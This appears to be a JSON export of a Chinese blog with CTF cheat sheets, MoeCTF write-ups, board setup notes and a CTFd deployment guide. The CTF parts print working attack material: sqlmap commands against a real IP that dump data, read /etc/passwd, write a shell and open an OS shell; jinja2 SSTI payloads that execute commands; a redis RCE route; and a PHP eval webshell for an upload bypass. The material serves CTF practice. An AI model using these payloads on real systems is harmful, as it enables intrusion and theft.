：查询角色     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —roles   —tables ： 查看所有的表     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —tables   -T ： 指定表     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ -T table_name   —columns ： 查看所有的字段     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —columns   -C ： 指定字段     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ -C column_name   —count ： 计数，查看有多少条数据     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —count   —exclude-sysdbs ： 排除系统库     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —exclude-sysdbs   —dump ： 查看数据     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —dump   —start 3 ： 查看第三条     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —start 3   —end 4 ： 查看第四条     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —end 4   —sql-query “select * from users” ： 执行语句     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —sql-query “select * from users”   —common-columns ： 暴力破解字段，应用于两种情况：①无权限读取数据。②mysql&lt;5.0 ，没有infomation_schema库     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —common-columns   —common-tables ： 暴力破解表     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —common-tables   十.其他参数  —batch ： 自动选是     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —batch   —charset：强制字符编码     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —charset=GBK   —crawl：爬站深度     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —crawl=3   —csv-del：指定csv文件的分隔符     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —csv-del=”;”   —flush-session ： 清空session     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —flush-session   —force-ssl ： 强制使用HTTPS     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —force-ssl   —fresh-queries ： 重新检测，不使用本地已查询的数据     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —fresh-queries   —hex ： 以16进制的形式编码dump出来的数据     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —hex   —parse-errors ： 分析和显示数据库内建报错信息     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —parse-errors   —answer ： 回答     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —answer=”extending=N”   —check-waf ： 检测WAF/IPS/IDS     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —check-waf   —hpp ： 绕过WAF/IPS/IDS     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —hpp   —identify-waf ： 彻底检测WAF/IPS/IDS     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —identify-waf   —mobile ： 模拟智能手机设备     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —mobile   —purge-output ： 清除output文件夹     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —purge-output   —smart ： 当有大量检测目标时，只选择基于错误的检测结果     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —smart   十一.高级注入参数  —file-read：文件系统访问     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —file-read=”/etc/passwd”   —file-write、—file-dest ：写文件到目标位置     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —file-write=”shell.php” —file-dest “/tmp/shell.php”   —sql-shell ： 进入交互式mysql窗口     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —sql-shell   —os-shell ： 进入命令行窗口     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —os-shell   使用Tor代理     sqlmap.py -u http://navisec.it/123.asp?id=1 —tor -tor-type=SOCKS5 —tor-port=9050 —check-tor   （二）redis  redis提权  redis未授权访问漏洞三种提权方式  有文件上传权限时  例：[NSSCTF - [天翼杯 2021]esay_eval (ctfer.vip)](https://www.ctfer.vip/problem/364)  通过找到redis密码，使用蚁剑插件进行链接，MODULE LOAD命令，在命令行下运行恶意脚本exp.soGitHub - Dliv3/redis-rogue-server: Redis 4.x/5.x RCE，之后使用system.exec “\"来获得终端权限。  （三）MongoDB  六、验证漏洞和逻辑漏洞  （一）文件上传  （二）远程执行  七、服务器模板渲染引擎注入  [Smarty]  在smarty中，低版本可以使用{php} {/php}标签执行php代码，新版本（3.1左右）不支持此标签，但仍然可以构造，{if phpinfo()}{/if}，在if标签中可以添加php代码。  [jinja2/flask]  1.控制结构 {% %}  {% if user %}  Hello,{{user}} !  {% else %}  Hello,Stranger!  {% endif %}   2.变量取值 {{ }}     jinja2模板中使用 {{ }} 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等。   3.注释 {# #}  由于jinja由python开，发python2与3差别较大，为了找到两个版本都通用的函数来进行注入，我们一般直接使用如下payload  {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('tac /flag.txt').read()\") }}{% endif %}{% endfor %}   第一句是为了获得子类，第二句为了获得找到了一个python2/3都有__builtins__的类 _IterationGuard的位置从而执行  或者直接从globals中寻找  {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %}   {% for b in c.__init__.__globals__.values() %}   {% if b.__class__ == {}.__class__ %}     {% if 'eval' in b.keys() %}       {{ b['eval']('__import__(\"os\").popen(\"id\").read()') }}     {% endif %}   {% endif %}   {% endfor %} {% endif %} {% endfor %}   [Thymeleaf]                 [Thymeleaf SSTI 分析以及最新版修复的 Bypass - panda       热爱安全的理想少年 (cnpanda.net)](https://www.cnpanda.net/sec/1063.html)           八、linux和windows  （一）常用命令  文件读取  cat:正序读取文件内容并输出 tac:倒序读取文件内容并输出 nl:与cat相同，但显示行号 less:显示行号，只能显示一页 tail:查看前10行 head:与tail相似   [MoeCTF2024垫刀之路一]  这道题目给我一个提醒，在Linux环境下可以使用echo显示环境变量具体内容：  echo $PATH   其中$是必须加的内容，代表环境变量，PATH是环境变量的名称，在这个题中，需要echo $FLAG。  九、常用工具  Python库  requests库  import requests   BeautifulSoup4库  BeautifulSoup4是爬虫必学的技能。BeautifulSoup最主要的功能是从网页抓取数据，Beautiful Soup自动将输入文档转换为Unicode编码，输出文档转换为utf-8编码。BeautifulSoup支持Python标准库中的HTML解析器,还支持一些第三方的解析器，如果我们不安装它，则 Python 会使用 Python默认的解释器。  BeautifulSoup4将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种:     Tag   NavigableString   BeautifulSoup   Comment"
  },
  
  {
    "title": "Quark-n（夸克开发板）学习笔记",
    "url": "/posts/Quark-note/",
    "categories": "Hardware",
    "tags": "coding, hardware",
    "date": "2023-10-05 14:06:00 +0800",
    "content": "author：lamaper  一、准备工序                 首先需要了解夸克（Quark）的各种属性，这是夸克开发板的wiki：[“夸克（Quark）”迷你开发者套件       Seeed Studio Wiki](https://wiki.seeedstudio.com/cn/Quantum-Mini-Linux-Development-Kit/)。           夸克使用全志3芯片，发热很高，需要加装散热片或风扇。  夸克使用USB Type-C进行供电和数据传输，可以使用虚拟终端软件来连接开发板，推荐的连接软件有MobaXtrem和XShell，MobaXterm个人版下载地址 (mobatek.net)，XSHELL 下载地址。  需要注意的是在使用Type-C连接开发板时，一定要下载对应的驱动，否则无法正常连接，出现的报错为：”未能成功安装驱动设备和程序“    观察到报错信息为”CP2102N USB to UART Bridge Controller“驱动未安装，所以我们下载相应的驱动CP2102 USB to UART Bridge Controller 驱动下载 - 驱动天空 (drvsky.com)，安装成功后即可正常连接。  接下来我们通过MobaXterm连接开发板，在主界面找到Session；  然后选择Serial，找到对应的串口连接，调整数据传输速度Speed到适应的数值，点击OK即可正常连接。  推荐观看【教你玩】稚晖君的夸克的EMMC、扩容、WIFI、GPIO_哔哩哔哩_bilibili  二、基础设置  1、安装系统     与树莓派一样，Quark-N可以通过SD卡上面烧录的镜像启动系统，但是也可以通过SOM上搭载的eMMC启动系统。启动顺序是这样的：         当检测到SD卡插入且包含可启动的系统时，会进入SD卡系统     否则如果eMMC中有可启动的系统的话，就会进入eMMC的系统       另外值得注意的是，不论是从SD卡启动还是从eMMC启动，当前运行系统所在的储存设备名都是/dev/mmcblk0，操作相关文件的时候不要弄错了。    比较合理的开发模式是：                使用Atom-N开发套件验证您的项目，运行在SD卡中的镜像系统                 验证完成项目之后通过Atom-N底板将SD卡中调试好的系统通过dd命令等方式拷贝到eMMC                 设计自己的底板（无需添加SD卡），插上调试好的Quark-N顺利部署系统                                         [^*]: 来自 [“夸克（Quark）”迷你开发者套件             Seeed Studio Wiki](https://wiki.seeedstudio.com/cn/Quantum-Mini-Linux-Development-Kit/)                                      我们可以先烧录镜像到TF卡上，然后拷贝到emmc中，进行首次亮机。  首先下载最新系统镜像quark-n-21-1-11，然后使用balenaEtcher - Flash OS images to SD cards &amp; USB drives工具将镜像烧录到TF卡中，紧接着插入TF到开发板卡槽中，启动开发板。  进入系统后首先转移系统到emmc上，在此之前，先通过sudo fdisk -i获得磁盘参数，然后运行以下命令  sudo dd if=/dev/mmcblk0 of=/dev/mmcblk1 bs=512 count=\"EMMC的Block数+1\" &amp;   为了观察复制进度，运行以下命令：  sudo watch -n 5 pkill -USR1 ^dd$   等待复制结束后，emmc中存在一个新的系统。此时拔掉TF卡，重新启动开发板，进入到emmc系统中。  2、联网  首先在emmc中启动WiFi，  sudo nmcli r wifi on   扫描附近的WiFi，  sudo nmcli dev wifi   首次链接特定的WiFi：  sudo nmcli dev wifi connect \"SSID\" password \"PASSWORD\"   重启网卡，  sudo ifconfig wlan0 down sudo ifconfig wlan0 up   ping百度检查网络连接，  ping www.baidu.com   3、扩容  在emmc环境下，使用命令，  sudo fdisk -l   发现TF的可用空间很小，一大部分都未被使用，因而我们需要扩容空间，在联网的前提下，查看开发板ip，  ifconfig   之后使用Windows自带的远程桌面连接：    用户名为pi，密码为quark    右键file system/Applications/System/Gparted，进入界面    对TF卡进行操作，修改mmcblk1p3的大小，最后点击最上方对勾完成修改。  注意：mmcblk0是当前运行的系统磁盘，无法修改，只能修改mmcblk1，上图举例没有切换为emmc系统  4、更新  扩容结束后，通过TF重新启动，现在将ubuntu16.04升级到18.04，注意，此时TF系统没有联网，需要重复上述联网操作，然后：  sudo apt-get update sudo apt-get upgrade sudo apt-get autoremove sudo apt dist-upgrade   安装update-manager-core，执行如下命令：  sudo apt-get install update-manager-core   执行系统升级，执行如下命令：  sudo do-release-upgrade   升级过程中遇到的问题提示 “Your python3 install is corrupted. Please fix the ‘/usr/bin/python3’ symlink.”，执行如下命令：  sudo ln -sf /usr/bin/python2.7 /usr/bin/python sudo ln -sf /usr/bin/python3.5 /usr/bin/python3   更新后需要重新配置python3，  首先安装python3的pip模块，  sudo apt-get install python3-pip   安装python3的包，  sudo python3 -m pip install fire  sudo python3 -m pip install ruamel.yaml  sudo python3 -m pip install pygame==1.9.6  sudo python3 -m pip install python-periphery  sudo python3 -m pip install PyYAML  sudo python3 -m pip install Markdown  sudo python3 -m pip install tornado  sudo python3 -m pip install smbus sudo python3 -m pip install Pillow sudo python3 -m pip install numpy   更新之后，xrdp会出现问题无法启动，这时要解决这个问题：  cd Workspace/ mkdir Git/ cd Git/ git clone https://gitee.com/coolflyreg163/quark-n.git cd quark-n/   备份并改变xrdp配置文件：  sudo cp /etc/xrdp/sesman.ini /etc/xrdp/sesman.ini.back sudo cp /etc/xrdp/xrdp.ini /etc/xrdp/xrdp.ini.back  sudo cp ~/Workspace/Git/quark-n/sesman.ini /etc/xrdp/sesman.ini sudo cp ~/Workspace/Git/quark-n/xrdp.ini /etc/xrdp/xrdp.ini   之后远程桌面可以正常启动。  5、安装依赖  docker是常用的容器管理工具，安装docker会让项目部署更加便捷：  sudo apt-get install docker   java是运行很多服务端程序必须的环境，java主流的长期支持版本有java8和java17，这里使用java17：  sudo apt-get install openjdk-17-jre   三、部署项目  1、数码屏          下载源代码      mkdir ~/GIT cd ~/GIT git clone https://gitee.com/coolflyreg163/quark-n.git                 如果很早之前已经下载过源代码，需要更新，可以运行如下命令（这一步非必须）      cd ~/GIT/quark-n git pull origin master                备份之前的Clock      cd /home/pi/WorkSpace/ mv Clock Clock_bak                将Clock放置到指定位置      ln -s /home/pi/GIT/quark-n/WorkSpace/Clock ~/WorkSpace/                将启动脚本放置到指定位置      chmod +x /home/pi/GIT/quark-n/WorkSpace/Scripts/start_ui_clock.sh mkdir -p ~/WorkSpace/Scripts/services ln -s /home/pi/GIT/quark-n/WorkSpace/Scripts/services/ui_clock.service ~/WorkSpace/Scripts/services/ ln -s /home/pi/GIT/quark-n/WorkSpace/Scripts/start_ui_clock.sh ~/WorkSpace/Scripts/                从这里，下载2个字体文件：“STHeiti Light.ttc”，“PingFang.ttc”，拷贝到~/WorkSpace/Clock/fonts。      https://gitee.com/coolflyreg163/quark-n/releases/Fonts           或运行命令      cd ~/WorkSpace/Clock/fonts wget https://gitee.com/coolflyreg163/quark-n/attach_files/603438/download/STHeiti%20Light.ttc wget https://gitee.com/coolflyreg163/quark-n/attach_files/603439/download/PingFang.ttc                运行如下命令进行安装      cd /home/pi/WorkSpace/Clock/ sudo python -m pip install --index http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com -r requirements.txt mkdir /home/pi/WorkSpace/Clock/logs sudo ln -s /home/pi/WorkSpace/Scripts/services/ui_clock.service /lib/systemd/system/ sudo systemctl daemon-reload sudo systemctl enable ui_clock           ruamel.yaml 需要使用阿里云的镜像来安装，豆瓣的镜像里没有！      到达这一步，已经在重启后会自动启动。下面是手动命令           命令提示：                      启动 （手动启动后按Ctrl + C可脱离）          sudo systemctl start ui_clock                                停止          sudo systemctl stop ui_clock                                查看状态          sudo systemctl status ui_clock                                重启系统          sudo shutdown -r now                           sudo nmcli connection add \\  type wifi con-name \"BIT-Mobile\" ifname wlp3s0 ssid \"BIT-Mobile\" -- \\  wifi-sec.key-mgmt wpa-eap 802-1x.eap ttls \\  802-1x.phase2-auth mschapv2 802-1x.identity \"1120241725\""
  },
  
  {
    "title": "Moectf2022的一些wp",
    "url": "/posts/moectf2022/",
    "categories": "Cyber Security",
    "tags": "ctf, web, php",
    "date": "2023-08-20 12:00:00 +0800",
    "content": "MoeCTF2022 WP  @author：lamaper  @email：lamaper@qq.com  web  1.ezhtml  浏览器按F12查看网络流，发现文件evil.js，双击打开  var sx = document.querySelector('#sx'); var yw = document.querySelector('#yw'); var wy = document.querySelector('#wy'); var zh = document.querySelector('#zh'); var zf = document.querySelector('#zf'); var arr = [sx, yw, wy, zh]; var flag = false; function check() {     if (flag == true) {         clearInterval(timer);     }     var sum = 0;     for (var i = 0; i &lt; arr.length; i++) {         sum += eval(arr[i].innerHTML);     }     if (sum == eval(zf.innerHTML) &amp;&amp; sum &gt; 600) {         alert('moectf{W3lc0me_to_theWorldOf_Web!}');         flag = true;     } } var timer = setInterval(check, 1000);   发现flagmoectf{W3lc0me_to_theWorldOf_Web!}  2.God_of_Aim  浏览器F12查看网络流，发现三个js文件target.js、index.js、aimtrainer.js  在aimtrainer.js中发现代码被混淆成无法阅读的状态  var _0x78bd=[\"\\x61\\x69\\x6D\\x54\\x72\\x61\\x69\\x6E\\x65\\x72\\x45\\x6C\",\"\\x61\\x69\\x6D\\x2D\\x74\\x72\\x61\\x69\\x6E\\x65\\x72\",\"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\",\"\\x73\\x63\\x6F\\x72\\x65\\x45\\x6C\",\"\\x73\\x63\\x6F\\x72\\x65\",\"\\x61\\x69\\x6D\\x73\\x63\\x6F\\x72\\x65\",\"\\x64\\x65\\x6C\\x61\\x79\",\"\\x74\\x61\\x72\\x67\\x65\\x74\\x53\\x69\\x7A\\x65\",\"\\x61\\x69\\x6D\\x73\\x63\\x6F\\x72\\x65\\x45\\x4C\",\"\\x73\\x65\\x74\\x53\\x63\\x6F\\x72\\x65\",\"\\x73\\x74\\x61\\x72\\x74\",\"\\x69\\x6E\\x6E\\x65\\x72\\x48\\x54\\x4D\\x4C\",\"\\x73\\x65\\x74\\x41\\x69\\x6D\\x53\\x63\\x6F\\x72\\x65\",\"\\x70\\x6F\\x73\\x69\\x74\\x69\\x6F\\x6E\",\"\\x73\\x74\\x79\\x6C\\x65\",\"\\x72\\x65\\x6C\\x61\\x74\\x69\\x76\\x65\",\"\\x74\\x69\\x6D\\x65\\x72\",\"\\x63\\x72\\x65\\x61\\x74\\x65\\x54\\x61\\x72\\x67\\x65\\x74\",\"\\x63\\x68\\x65\\x63\\x6B\\x66\\x6C\\x61\\x67\\x31\",\"\\x63\\x68\\x65\\x63\\x6B\\x66\\x6C\\x61\\x67\\x32\",\"\\x73\\x74\\x6F\\x70\",\"\\x6D\\x6F\\x65\\x63\\x74\\x66\\x7B\\x4F\\x68\\x5F\\x79\\x6F\\x75\\x5F\\x63\\x61\\x6E\\x5F\\x61\\x31\\x6D\\x5F\",\"\\u4F60\\u5DF2\\u7ECF\\u5B66\\u4F1A\\u7784\\u51C6\\u4E86\\uFF01\\u8BD5\\u8BD5\\u770B\\x3A\",\"\\x73\\x74\\x61\\x72\\x74\\x32\",\"\\x61\\x6E\\x64\\x5F\\x48\\x34\\x63\\x6B\\x5F\\x4A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x7D\",\"\"];class AimTrainer{constructor({_0xf777x2,_0xf777x3}){this[_0x78bd[0]]= document[_0x78bd[2]](_0x78bd[1]);this[_0x78bd[3]]= document[_0x78bd[2]](_0x78bd[4]);this[_0x78bd[4]]= 0;this[_0x78bd[5]]= 0;this[_0x78bd[6]]= _0xf777x2|| 1000;this[_0x78bd[7]]= _0xf777x3|| 30;this[_0x78bd[8]]= document[_0x78bd[2]](_0x78bd[5])}createTarget(){const _0xf777x5= new Target({delay:this[_0x78bd[6]],targetSize:this[_0x78bd[7]],aimTrainerEl:this[_0x78bd[0]],onTargetHit:()=&gt;{this[_0x78bd[9]](this[_0x78bd[4]]+ 1)}});_0xf777x5[_0x78bd[10]]()}setScore(_0xf777x7){this[_0x78bd[4]]= _0xf777x7;this[_0x78bd[3]][_0x78bd[11]]= this[_0x78bd[4]]}setAimScore(_0xf777x7){this[_0x78bd[5]]= _0xf777x7;this[_0x78bd[8]][_0x78bd[11]]= _0xf777x7}start1(){this[_0x78bd[9]](0);this[_0x78bd[12]](10);this[_0x78bd[0]][_0x78bd[14]][_0x78bd[13]]= _0x78bd[15];if(!this[_0x78bd[16]]){this[_0x78bd[16]]= setInterval(()=&gt;{this[_0x78bd[17]]();this[_0x78bd[3]][_0x78bd[11]]= this[_0x78bd[4]];this[_0x78bd[18]]()},this[_0x78bd[6]])}else {return}}start2(){this[_0x78bd[7]]= 10;this[_0x78bd[6]]= 400;this[_0x78bd[9]](0);this[_0x78bd[12]](100000);this[_0x78bd[0]][_0x78bd[14]][_0x78bd[13]]= _0x78bd[15];if(!this[_0x78bd[16]]){this[_0x78bd[16]]= setInterval(()=&gt;{this[_0x78bd[17]]();this[_0x78bd[3]][_0x78bd[11]]= this[_0x78bd[4]];this[_0x78bd[19]]()},this[_0x78bd[6]])}else {return}}checkflag1(){if(this[_0x78bd[4]]== this[_0x78bd[5]]){this[_0x78bd[20]]();alert(_0x78bd[21]);alert(_0x78bd[22]);this[_0x78bd[23]]()}}checkflag2(){if(this[_0x78bd[4]]== this[_0x78bd[5]]){this[_0x78bd[20]]();alert(_0x78bd[24])}}stop(){this[_0x78bd[0]][_0x78bd[11]]= _0x78bd[25];if(this[_0x78bd[16]]){clearInterval(this[_0x78bd[16]]);this[_0x78bd[16]]= 0}else {return}}}   利用反混淆工具obfuscator解密 - dejs.vip (idd1.com)进行反混淆，得到代码：  class AimTrainer {     constructor({_0xf777x2, _0xf777x3}) {         this.aimTrainerEl = document.getElementById(\"aim-trainer\");         this.scoreEl = document.getElementById(\"score\");         this.score = 0;         this.aimscore = 0;         this.delay = _0xf777x2 || 1000;         this.targetSize = _0xf777x3 || 30;         this.aimscoreEL = document.getElementById(\"aimscore\");     }     createTarget() {         const target = new Target({             delay: this.delay,             targetSize: this.targetSize,             aimTrainerEl: this.aimTrainerEl,             onTargetHit: () =&gt; {                 this.setScore(this.score + 1);             }         });         target.start();     }     setScore(scoreValue) {         this.score = scoreValue;         this.scoreEl.innerHTML = this.score;     }     setAimScore(scoreValue) {         this.aimscore = scoreValue;         this.aimscoreEL.innerHTML = scoreValue;     }     start1() {         this.setScore(0);         this.setAimScore(10);         this.aimTrainerEl.style.position = \"relative\";         if (!this.timer) {             this.timer = setInterval(() =&gt; {                 this.createTarget();                 this.scoreEl.innerHTML = this.score;                 this.checkflag1();             }, this.delay);         } else {             return;         }     }     start2() {         this.targetSize = 10;         this.delay = 400;         this.setScore(0);         this.setAimScore(100000);         this.aimTrainerEl.style.position = \"relative\";         if (!this.timer) {             this.timer = setInterval(() =&gt; {                 this.createTarget();                 this.scoreEl.innerHTML = this.score;                 this.checkflag2();             }, this.delay);         } else {             return;         }     }     checkflag1() {         if (this.score == this.aimscore) {             this.stop();             alert(\"moectf{Oh_you_can_a1m_\");             alert(\"你已经学会瞄准了\\uFF01试试看:\");             this.start2();         }     }     checkflag2() {         if (this.score == this.aimscore) {             this.stop();             alert(\"and_H4ck_Javascript}\");         }     }     stop() {         this.aimTrainerEl.innerHTML = \"\";         if (this.timer) {             clearInterval(this.timer);             this.timer = 0;         } else {             return;         }     } }   得到flagmoectf{Oh_you_can_a1m_and_H4ck_Javascript}"
  },
  
  {
    "title": "Moectf2023的一些wp",
    "url": "/posts/moectf2023/",
    "categories": "Cyber Security",
    "tags": "ctf, web, php",
    "date": "2023-08-19 12:00:00 +0800",
    "content": "MoeCTF2023 WP  @author：lamaper  @email：lamaper@qq.com  2023/8/19 12:13  Web  1.http  按照要求修改请求头  POST www.xxx.com/?UwU=u HTTP/1.1 Host: localhost:1189 User-Agent: MoeBrowser Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 5 Origin: http://localhost:1189 Connection: keep-alive Referer: 127.0.0.1 X-Forwarded-For:127.0.0.1 Cookie: character=admin Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1   2.入门指北  原始文本  666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c5131524758316379596c396a61474673624756755a3055684958303d   观察知道是hex，遂解码  flag=bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0=   观察知道是base64加密，遂解密  moectf{w3lCome_To_moeCTF_W2b_challengE!!}   3.彼岸的flag  F12看源码，flag藏在注释里  *4.Cookie  摸不着头脑  5.gas!gas!gas!  先看js     6.moe图床  F12发现有段js  &lt;script&gt;         function uploadFile() {             const fileInput = document.getElementById('fileInput');             const file = fileInput.files[0];                          if (!file) {                 alert('请选择一个文件进行上传！');                 return;             }                          const allowedExtensions = ['png'];             const fileExtension = file.name.split('.').pop().toLowerCase();             if (!allowedExtensions.includes(fileExtension)) {                 alert('只允许上传后缀名为png的文件！');                 return;             }                          const formData = new FormData();             formData.append('file', file);              fetch('upload.php', {                 method: 'POST',                 body: formData             })             .then(response =&gt; response.json())             .then(result =&gt; {                 if (result.success) {                     const uploadResult = document.getElementById('uploadResult');                     const para = document.createElement('p');                     para.textContent = ('地址：');                     const link = document.createElement('a');                     link.textContent = result.file_path;                     link.href = result.file_path;                     link.target = '_blank';                     para.append(link);                     uploadResult.appendChild(para);                      alert('文件上传成功！');                 } else {                     alert('文件上传失败：' + result.message);                 }             })             .catch(error =&gt; {                 console.error('文件上传失败:', error);             });         }   遂转到http://....../upload.php   &lt;?php $targetDir = 'uploads/'; $allowedExtensions = ['png'];   if ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; isset($_FILES['file'])) {     $file = $_FILES['file'];     $tmp_path = $_FILES['file']['tmp_name'];      if ($file['type'] !== 'image/png') {//类型必须是image/png         die(json_encode(['success' =&gt; false, 'message' =&gt; '文件类型不符合要求']));     }      if (filesize($tmp_path) &gt; 512 * 1024) {//大小有限制         die(json_encode(['success' =&gt; false, 'message' =&gt; '文件太大']));     }      $fileName = $file['name'];     $fileNameParts = explode('.', $fileName);//分割文件名 /* test.png.php fileNameParts[0] = 'test' fileNameParts[1] = 'png' = $secondSegment fileNameParts[2] = 'php' */     if (count($fileNameParts) &gt;= 2) {//文件必须有扩展名         $secondSegment = $fileNameParts[1];//第二段         if ($secondSegment !== 'png') {//不是png             die(json_encode(['success' =&gt; false, 'message' =&gt; '文件后缀不符合要求']));         }     } else {         die(json_encode(['success' =&gt; false, 'message' =&gt; '文件后缀不符合要求']));     }      $uploadFilePath = dirname(__FILE__) . '/' . $targetDir . basename($file['name']);      if (move_uploaded_file($tmp_path, $uploadFilePath)) {         die(json_encode(['success' =&gt; true, 'file_path' =&gt; $uploadFilePath]));     } else {         die(json_encode(['success' =&gt; false, 'message' =&gt; '文件上传失败']));     } } else{     highlight_file(__FILE__); } ?&gt;    所以构建a.png.php  &lt;?php \teval(@$_POST['password']); ?&gt;   上传到/var/www/html/uploads/a.png.php，但实际上对应的网址是http://xxx.xxx.xxx/uploads/a.png.php  之后使用中国蚁剑链接，在根目录下找到flagmoectf{hmmm_improper_filter_ETZzkuWbtpEvHgwPhbdIlaP6TSSNrHE7}  Base  1.CCCCC  打开Dev-cpp运行一下  2.Python  python运行一下  3.runme  cmd/powershell直接调用 .\\runme.exe  Misc  1.入门  观察得base64加密，遂解密  moectf{h@v3_fun_@t_m15c_!}   CLassical Crypto  1.ezrot  rot47加密，在线解密即可  Reverse  2.base_64  首先进行pyc反编译  #!/usr/bin/env python # visit https://tool.lu/pyc/ for more information # Version: Python 3.7  import base64 from string import * str1 = 'yD9oB3Inv3YAB19YynIuJnUaAGB0um0=' string1 = 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/' string2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' flag = input('welcome to moectf\\ninput your flag and I wiil check it:') enc_flag = base64.b64encode(flag.encode()).decode() enc_flag = enc_flag.translate(str.maketrans(string2, string1)) if enc_flag == str1:     print('good job!!!!') else:     print('something wrong???')     exit(0)    string1和string2有唯一映射关系，将str1中的字符用string2的字符替换，得到  bW9lY3Rme3BZY19BbmRFQmFzZTY0fn0=   base64解密得到  moectf{pYc_AndEBase64~}"
  },
  
  {
    "title": "Debian11+CTFd+Docker部署动态靶机",
    "url": "/posts/debian-ctfd/",
    "categories": "Cyber Security",
    "tags": "ctf, ctfd",
    "date": "2023-01-26 12:00:00 +0800",
    "content": "lamaper@qq.com  一、准备工作  换源  apt换源  存放apt源的配置文件路径为/etc/apt/source.list，首先要对这个配置文件进行备份，备份命令如下。  sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak   如果需要恢复原来的配置文件，只需要用备份的配置文件覆盖原来的配置文件即可，命令如下。  sudo cp /etc/apt/sources.list.bak /etc/apt/sources.list   使用nano打开source.list文件，命令如下。  sudo nano /etc/apt/sources.list   根据需要进行换源，这里更换为清华大学源：  deb https://mirrors.tuna.tsinghua.edu.cn/debian/ stretch main non-free contrib deb https://mirrors.tuna.tsinghua.edu.cn/debian/ stretch-updates main non-free contrib deb https://mirrors.tuna.tsinghua.edu.cn/debian/ stretch-backports main non-free contrib deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ stretch main non-free contrib deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ stretch-updates main non-free contrib deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ stretch-backports main non-free contrib deb https://mirrors.tuna.tsinghua.edu.cn/debian-security/ stretch/updates main non-free contrib deb-src https://mirrors.tuna.tsinghua.edu.cn/debian-security/ stretch/updates main non-free contrib   安装pip及换源  安装pip  sudo apt install python3-pip   换源  pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pip -U   pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple   安装flask  sudo pip install flask   安装gunicore（后台运行）  sudo pip install gunicore   安装gevent  sudo pip intsall gevent   安装nginx  sudo apt install nginx   安装supervisor  sudo apt install supervisor   安装git  sudo apt install git   安装ssh（可选）  sudo apt install ssh   修改配置文件  克隆仓库  下载改写的ctfd，赵师傅已经完成了镜像换源等操作  sudo git clone https://github.com/glzjin/CTFd.git   下方的准备是为了后期开启动态靶机：  下载frp  wget https://github.com/fatedier/frp/releases/download/v0.29.0/frp_0.29.0_linux_amd64.tar.gz  tar -zxvf frp_0.29.0_linux_amd64.tar.gz   下载ctf-whale  sudo git clone https://github.com/glzjin/CTFd-Whale.git   下载docker的frps  sudo git clone https://github.com/glzjin/Frp-Docker-For-CTFd-Whale.git   二、运行服务  进入ctfd目录  cd CTFd-master   安装依赖  chmod 777 prepare.sh vim prepare.sh  pip install -r requirements.txt -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com  ./prepare.sh   通过nohup守护gunicorn进程先开启服务  nohup gunicorn --bind 0.0.0.0:8000 -w 9 --worker-class=\"gevent\" \"CTFd:create_app()\"#w表示进程数，建议 cpu核心数*2+1   部署nginx代理  cd /etc/nginx/sites-enabled/   rm default   